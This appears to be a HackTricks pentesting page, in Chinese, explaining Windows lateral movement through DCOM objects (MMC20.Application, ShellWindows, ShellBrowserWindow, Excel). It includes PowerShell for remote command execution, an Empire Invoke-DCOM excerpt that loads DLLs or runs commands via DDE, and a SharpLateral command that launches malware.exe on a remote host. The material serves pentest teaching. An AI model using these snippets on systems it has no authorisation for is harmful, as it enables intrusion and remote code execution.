# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**看到您的**公司广告**，或者想获得**PEASS最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便更快修复。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM**（分布式组件对象模型）对象之所以**有趣**，是因为它们能够**通过网络与对象交互**。微软在[这里](https://msdn.microsoft.com/en-us/library/cc226801.aspx)有关于DCOM的很好的文档，以及在[这里](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)有关于COM的文档。您可以通过运行`Get-CimInstance Win32_DCOMApplication`使用PowerShell找到一份完整的DCOM应用程序列表。

[MMC应用程序类 (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM对象允许您脚本化MMC管理单元操作的组件。在枚举这个COM对象中的不同方法和属性时，我注意到在Document.ActiveView下有一个名为`ExecuteShellCommand`的方法。

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

您可以在[这里](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)阅读更多关于该方法的信息。到目前为止，我们有一个可以通过网络访问并且可以执行命令的DCOM应用程序。最后一步是利用这个DCOM应用程序和ExecuteShellCommand方法在远程主机上获得代码执行。

幸运的是，作为管理员，您可以通过使用“`[activator]::CreateInstance([type]::GetTypeFromProgID`”在PowerShell中远程与DCOM交互。您所需要做的就是提供一个DCOM ProgID和一个IP地址。然后它会远程提供给您一个该COM对象的实例：

![](<../../.gitbook/assets/image (665).png>)

然后可以调用`ExecuteShellCommand`方法在远程主机上启动一个进程：

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

**MMC20.Application**对象缺少明确的“[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)”，导致默认权限集允许管理员访问：

![](<../../.gitbook/assets/image (4) (1) (2).png>)

您可以在[这里](https://twitter.com/tiraniddo/status/817532039771525120)阅读更多关于该线程的信息。\
使用[@tiraniddo](https://twitter.com/tiraniddo)的[OleView .NET](https://github.com/tyranid/oleviewdotnet)（其中包括优秀的Python过滤器等）可以查看哪些其他对象没有设置明确的LaunchPermission。在这种情况下，我们可以筛选出所有没有明确设置Launch Permission的对象。在这样做时，有两个对象引起了我的注意：`ShellBrowserWindow`和`ShellWindows`：

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

另一种识别潜在目标对象的方法是查找`HKCR:\AppID\{guid}`中缺少`LaunchPermission`值的键。设置了Launch Permissions的对象将如下所示，数据以二进制格式表示对象的ACL：

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

那些没有明确设置LaunchPermission的将缺少该特定的注册表项。

### ShellWindows

首先探索的对象是[ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)。由于这个对象没有关联的[ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx)，我们可以使用[Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET方法配合[Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx)方法通过其AppID在远程主机上实例化该对象。为此，我们需要获取ShellWindows对象的[CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx)，这可以使用OleView .NET完成：

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

如您在下面看到的，“Launch Permission”字段是空的，意味着没有设置明确的权限。

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

现在我们有了CLSID，我们可以在远程目标上实例化该对象：
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote_instantiation_shellwindows.png?w=690&h=354)

在远程主机上实例化对象后，我们可以与之接口并调用任何我们想要的方法。返回的对象句柄揭示了几种方法和属性，但我们无法与之交互。为了实现与远程主机的实际交互，我们需要访问 [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) 方法，这将返回一个代表 Windows shell 窗口的对象：
```
$item = $obj.Item()
```
```markdown
![](https://enigma0x3.files.wordpress.com/2017/01/item_instantiation.png?w=416&h=465)

在完全控制了Shell窗口后，我们现在可以访问所有预期的方法/属性。在仔细研究这些方法后，**`Document.Application.ShellExecute`** 显得尤为突出。确保遵循该方法的参数要求，这些要求在[这里](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745(v=vs.85).aspx)有文档记录。
```
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
如上图所示，我们的命令已经在远程主机上成功执行。

### ShellBrowserWindow

这个特定对象在Windows 7上不存在，这使得它用于横向移动的能力比“ShellWindows”对象有限，后者我已在Win7-Win10上成功测试。

根据我对这个对象的枚举，它似乎有效地提供了一个接口进入Explorer窗口，就像前一个对象一样。要实例化这个对象，我们需要获取它的CLSID。类似于上面，我们可以使用OleView .NET：

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

再次注意空白的启动权限字段：

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

有了CLSID，我们可以重复之前对象上采取的步骤来实例化对象并调用相同的方法：
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow_command_execution.png?w=690&h=441)

如您所见，命令已成功在远程目标上执行。

由于此对象直接与Windows shell接口，我们不需要像之前的对象那样调用“ShellWindows.Item”方法。

虽然这两个DCOM对象可以用来在远程主机上运行shell命令，但还有许多其他有趣的方法可以用来枚举或篡改远程目标。其中一些方法包括：

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

以类似的方式，可以通过滥用DCOM Excel对象进行横向移动，更多信息请阅读 [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## 自动化工具

* Powershell 脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) 可以轻松调用所有注释过的方法在其他机器上执行代码。
* 你也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 参考资料

* 第一种方法复制自 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)，更多信息请点击链接
* 第二部分复制自 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)，更多信息请点击链接

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到对您最重要的漏洞，以便更快修复。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从 API 到 web 应用程序和云系统。今天就[**免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

其他支持 HackTricks 的方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
